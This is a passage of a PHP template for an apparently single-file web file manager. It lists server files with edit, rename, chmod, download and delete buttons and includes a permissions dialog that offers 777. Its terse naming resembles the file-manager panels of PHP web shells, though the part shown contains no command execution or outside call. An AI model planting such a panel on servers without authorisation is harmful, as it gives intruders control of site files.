<div id="ri-<?=htmlentities($_i)?>" style="display:none;gap:6px;align-items:center">
<input type="text" id="rv-<?=htmlentities($_i)?>" value="<?=htmlentities($_i)?>" style="flex:1">
<button class="bt bt-p bt-x" onclick="rns('<?=addslashes($_i)?>')">OK</button>
<button class="bt bt-g bt-x" onclick="rnc('<?=addslashes($_i)?>')">X</button>
</div>
</td>
<td><span class="fm"><?=$_id?'Dir':($_el?:'-')?></span></td>
<td style="text-align:right"><span class="fm"><?=$_id?'&mdash;':_fs($_sz)?></span></td>
<td><span class="fm"><?=$_mt?date('Y-m-d H:i',$_mt):'-'?></span></td>
<td style="text-align:center"><span class="pm <?=$_cw?'pw':'pr'?>"><?=htmlentities($_pm)?></span><input type="hidden" id="p_<?=md5($_i)?>" value="<?=htmlentities($_pm)?>"></td>
<td><div class="ac">
<?php if(!$_id):?><button class="bt bt-g bt-x" onclick="ed('<?=addslashes($_i)?>')">Ed</button><?php endif;?>
<button class="bt bt-g bt-x" onclick="rni('<?=addslashes($_i)?>')">Rn</button>
<button class="bt bt-g bt-x" onclick="cm('<?=htmlentities($_i)?>','p_<?=md5($_i)?>')">Ch</button>
<button class="bt bt-g bt-x" onclick="dlf('<?=addslashes($_i)?>')">Dl</button>
<button class="bt bt-d bt-x" onclick="del('<?=addslashes($_i)?>')">X</button>
</div></td>
</tr>
<?php endforeach;?>
</tbody></table></div></div>

<div class="md" id="cmod"><div class="mc"><div class="mh"><span>Chmod</span><span class="mx" onclick="ccm()">&times;</span></div>
<form onsubmit="acm(event)"><input type="hidden" id="ci">
<div class="cg">
<div class="cgr"><div class="cgl">Owner</div><div class="cgc"><label><input type="checkbox" id="or" onchange="ucb()">R</label><label><input type="checkbox" id="ow" onchange="ucb()">W</label><label><input type="checkbox" id="ox" onchange="ucb()">X</label></div></div>
<div class="cgr"><div class="cgl">Group</div><div class="cgc"><label><input type="checkbox" id="gr" onchange="ucb()">R</label><label><input type="checkbox" id="gw" onchange="ucb()">W</label><label><input type="checkbox" id="gx" onchange="ucb()">X</label></div></div>
<div class="cgr"><div class="cgl">Other</div><div class="cgc"><label><input type="checkbox" id="tr" onchange="ucb()">R</label><label><input type="checkbox" id="tw" onchange="ucb()">W</label><label><input type="checkbox" id="tx" onchange="ucb()">X</label></div></div>
</div>
<div class="mb">
<div style="margin-bottom:12px;text-align:center"><input type="text" id="co" maxlength="3" style="width:60px;text-align:center;font-family:monospace"></div>
<div style="margin-bottom:12px;display:flex;gap:6px;flex-wrap:wrap">
<button type="button" class="bt bt-g bt-x" onclick="upd('755')">755</button>
<button type="button" class="bt bt-g bt-x" onclick="upd('644')">644</button>
<button type="button" class="bt bt-g bt-x" onclick="upd('777')">777</button>
</div>
<div style="display:flex;gap:6px"><button type="submit" class="bt bt-p">Apply</button><button type="button" class="bt bt-g" onclick="ccm()">Cancel</button></div>
</div></form></div></div>
</body></html>
